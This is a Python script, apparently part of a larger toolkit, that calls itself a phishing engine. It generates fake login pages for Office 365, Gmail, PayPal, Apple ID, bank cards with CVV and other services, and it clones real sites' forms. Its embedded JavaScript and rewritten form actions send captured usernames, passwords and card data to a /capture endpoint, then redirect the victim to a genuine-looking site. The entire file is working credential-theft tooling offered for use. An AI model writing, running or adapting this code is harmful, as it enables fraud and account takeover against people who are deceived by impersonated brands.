# 开发者：自由的风
"""phishing_engine/run.py — 钓鱼引擎
=====================================
攻击域 ready — 生成钓鱼页面,克隆网站,15种模板。
"""
import sys, json, os, urllib.request, urllib.error, re, time
from pathlib import Path

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PHISH_DIR = Path.home() / ".gbt" / "phishing"
PHISH_DIR.mkdir(parents=True, exist_ok=True)

TEMPLATES = {
    "generic_login": {"title": "通用登录页", "fields": ["username","password"]},
    "office365": {"title": "Office 365", "fields": ["email","password"]},
    "gmail": {"title": "Gmail", "fields": ["email","password"]},
    "github": {"title": "GitHub", "fields": ["username","password"]},
    "dropbox": {"title": "Dropbox", "fields": ["email","password"]},
    "bank": {"title": "网上银行", "fields": ["card_number","password","cvv"]},
    "paypal": {"title": "PayPal", "fields": ["email","password"]},
    "facebook": {"title": "Facebook", "fields": ["email","password"]},
    "twitter": {"title": "Twitter/X", "fields": ["email","password"]},
    "instagram": {"title": "Instagram", "fields": ["username","password"]},
    "linkedin": {"title": "LinkedIn", "fields": ["email","password"]},
    "netflix": {"title": "Netflix", "fields": ["email","password"]},
    "amazon": {"title": "Amazon", "fields": ["email","password"]},
    "apple_id": {"title": "Apple ID", "fields": ["email","password"]},
    "steam": {"title": "Steam", "fields": ["username","password"]},
}

CSS = """*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:380px;text-align:center}
.login-box h2{margin-bottom:20px;color:#1a73e8}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:14px}
button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:10px}
button:hover{background:#1557b0}"""

JS = """document.querySelector('form').addEventListener('submit',function(e){
e.preventDefault();
var d=new FormData(e.target);
var data={};
d.forEach(function(v,k){data[k]=v;});
fetch('/capture',{method:'POST',body:JSON.stringify(data),headers:{'Content-Type':'application/json'}})
.then(function(){window.location='REDIRECT_URL';});
});"""

def do_generate(params):
    template = params.get("template", "generic_login")
    redirect = params.get("redirect", "https://www.google.com")
    if template not in TEMPLATES:
        return {"ok": False, "error": "未知模板", "available": list(TEMPLATES.keys())}
    t = TEMPLATES[template]
    fields_html = ""
    for f in t["fields"]:
        ftype = "password" if f == "password" or f == "cvv" else "text"
        fields_html += '<input type="{}" name="{}" placeholder="{}" required>\n'.format(ftype, f, f.replace("_", " ").title())
    html = '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>' + t["title"] + '</title>\n'
    html += '<style>' + CSS + '</style></head>\n'
    html += '<body><div class="login-box"><h2>' + t["title"] + '</h2>\n'
    html += '<form method="POST" action="/capture">\n' + fields_html
    html += '<button type="submit">登 录</button></form>\n'
    html += '<p style="margin-top:15px;color:#666;font-size:12px">忘记密码?</p></div>\n'
    html += '<script>' + JS.replace("REDIRECT_URL", redirect) + '</script></body></html>'
    fpath = PHISH_DIR / "{}.html".format(template)
    fpath.write_text(html, encoding="utf-8")
    return {"ok": True, "cap": "phishing_engine", "action": "generate", "domain": "攻击域",
            "template": template, "file": str(fpath), "fields": t["fields"], "size": len(html)}

def do_clone(params):
    url = params.get("url", "")
    if not url: return {"ok": False, "error": "缺少url"}
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(req, timeout=15)
        html = resp.read().decode("utf-8", errors="replace")
        html = re.sub(r'<form[^>]*action="[^"]*"', '<form action="/capture"', html)
        form_match = re.search(r'<form[^>]*>.*?</form>', html, re.DOTALL | re.IGNORECASE)
        cloned = form_match.group(0) if form_match else html[:5000]
        fpath = PHISH_DIR / "cloned_{}.html".format(int(time.time()))
        fpath.write_text(cloned, encoding="utf-8")
        return {"ok": True, "cap": "phishing_engine", "action": "clone", "url": url, "file": str(fpath), "size": len(cloned)}
    except Exception as e:
        return {"ok": False, "error": str(e)[:200]}

def do_list(params):
    templates_info = {k: v["title"] for k, v in TEMPLATES.items()}
    files = [f.name for f in PHISH_DIR.glob("*.html")] if PHISH_DIR.exists() else []
    return {"ok": True, "templates": templates_info, "generated": files, "total": len(TEMPLATES)}

HANDLERS = {"generate": do_generate, "clone": do_clone, "list": do_list}
if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "list"
    params = {}
    if len(sys.argv) > 2:
        try: params = json.loads(sys.argv[2])
        except: pass
    handler = HANDLERS.get(action)
    result = handler(params) if handler else {"ok": False, "error": "未知:{}".format(action)}
    print(json.dumps(result, ensure_ascii=False, default=str))
